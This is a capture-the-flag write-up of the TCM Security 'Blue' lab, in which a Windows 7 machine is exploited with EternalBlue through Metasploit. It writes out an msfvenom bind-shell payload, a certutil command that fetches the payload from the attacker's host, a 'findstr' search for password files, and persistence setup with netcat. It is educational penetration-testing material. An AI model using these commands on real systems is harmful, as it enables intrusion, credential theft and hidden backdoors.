# CTF Writeup: Blue (TCM Security)

***Date***:09/20/2024

---
## Table of Contents
- Challenge Description
- Challenge Information
- Reconnaissance and Exploitation
- Lessons Learned

---

## Challenge Description
Enumerate and exploit a Windows 7 machine, and establish persistence. 
## Challenge Information
- **Name:** Blue
- **Category:** Windows 7, Network, Operating System
- **Difficulty:** Easy
- **CTF Platform:** TCM Security

---

## Reconnaissance and Exploitation

To begin, I made sure the machine was alive through a ping. Seeing it was alive, I moved on to an Nmap scan. 
```nmap -sV -A -Pn -p- -O2 192.168.81.133```

The flags seek to determine services on the machine, run available scripts against those machines, disable ping sweep, and scan all ports and not only the common ones. Through this, I found a bunch of services running on the machine. 

![Pasted image 20240920160411](https://github.com/user-attachments/assets/a1f6004f-cbce-41ce-b87c-1a878e59510d)

Below are the results from my Nmap Scan-
```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-dsS Windows 7 Ultimate 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
```

From here, I went through Metasploit and the Web through each service to identify exploits. I found a module in Metasploit that performed enumeration on SMB to find which version it is running, scanner/smb/smb_version. I found that SMB was running 1.2, which is vulnerable to EternalBlue, a exploit in Microsoft's implementation of the SMB protocol that was infamously used by the WannaCry ransomware. It allows remote attackers to execute arbitrary code by sending crafted messages to the vulnerable machine's SMBv1 service.
 I decided to go with this one because it is extremely effective against that version of SMB, being an 8.1 CVSS score, and it would allow me to execute code remotely. I searched it up on Metasploit and found an exploit, exploit/windows/smb/ms17_010_eternalblue, and used that. 

I take a look at my options through the show options command. From here, I manage my options:
```
set rhost 192.168.81.133
set rport 445
exploit. 
```
After a couple tries, the script works and I land on a Meterpreter shell. 

![Pasted image 20240920162915](https://github.com/user-attachments/assets/4c8755d6-28da-4bba-94e1-a2c91cdbb926)

From here, I run the commands systeminfo and ipconfig to ensure I am on the correct machine.  Ipconfig will list out the IP address of the machine, while systeminfo will spit out alot of relevant information about the machine, including Architecture, Operation System, Version, and more. One of my favorite one liners, discovered while going through the TCM course, ```systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"```, gives you the meat and potatoes of what you need: OS Name, Version, and the Architecture. 

I run some other enumeration commands, including:
-  `whoami` - Shows the current user or service account you are running as.
- `wmic logicaldisk get caption,description,providername` - Lists out the drives on the system, giving an overview of available file systems.
- `findstr /si password *.txt` - Searches the system for any files containing the word "password" in an attempt to find clear text credentials.


Enumeration is the king of Penetration Testing. You can never have too much information. 
If there was a flag objective, I would move on here to looking around the file system and seeing what things are around. Given the fact the objective is a simple exploit and not a flag, I move on to Persistence. 

If SSH, Telnet, or some other remote access tool was on, I would simply create a new user. However, as these are disabled, I opted to establish a backdoor. I simply used the built-in exploit/windows/local/persistence in my Meterpreter prompt. From here, I simply established my options, which port I preferred, and the type of shell. 

![Pasted image 20240920162915](https://github.com/user-attachments/assets/560881e6-fccc-4ce3-89f8-c9269bcde434)

I then set up a netcat on my own machine to listen for the callback.

![Pasted image 20240920163851](https://github.com/user-attachments/assets/6f8af57f-14e8-459f-8fdf-4f5e69a7cd2d)

Once the machine reboots, it'll reach out to me here and I'll have a shell. 

If Metasploit wasn't available, I have some other options. I could've used a combination of setting up a server and certutil in order to download the shell onto the machine.

First, I would set up a server on my machine using the common python3 library http.server.
```python3 -m http.server 80```

After that, I would create a backdoor using Msfconsole, as so:
```msfvenom -p windows/shell_bind_tcp LHOST=192.168.81.131 LPORT=1231 -f exe > prompt.exe```
I'm using a Stageless Payload because of the fact that in a backdoor you want it all sent at once, rather than a Staged payload, which splits it up. I am also using the non-traditional 1231 port rather than 4444 to hopefully circumvent firewall rules. 4444 is the default port for Metasploit, and any firewall worth its salt would block traffic on that port. By choosing a less common port, I hoped to evade such rules.

From here, as I am now hosting this file, I would go to my RCE Shell and use certutil, a tool commonly exploited to transfer files, to download the prompt.
```certutil -urlcache -split -f "http://192.168.81.131:80/bind.exe" prompt.exe```

I drop from my Meterpreter shell and start the executable. 

![Pasted image 20240920175020](https://github.com/user-attachments/assets/5909f3d5-dc40-4923-ad66-5eb2fe282ae7)

I then Netcat into the machine;

![Pasted image 20240920175601](https://github.com/user-attachments/assets/a8767b71-a610-492b-aa77-d139f8ede27e)

And there you have it! A working backdoor. 
## Lessons Learned
One of the largest mistakes I had was not properly vetting the other services. Once I saw the SMB Vulnerability, I went straight for it without a second thought. I should've gone through the rest of the services and stockpiled a few different exploits before I started trying to get into the box. I also could've used tools like Smbclient on SMB rather than relying on Metasploit. 

Another big pitfall that I had was my notetaking. I was on top of it to begin with but once I exploited the machine and ran post-exploitation I started letting it slack. I shouldn't have had to go back in my machine to pull the screenshots for this Write-Up, as I should've taken them all as the discoveries happened. 

**Key Takeaways:**
- Always conduct thorough reconnaissance and explore multiple service vulnerabilities instead of jumping to the first one discovered.
- Maintain detailed and organized notes throughout the entire process to avoid backtracking.
- Use multiple tools in your enumeration
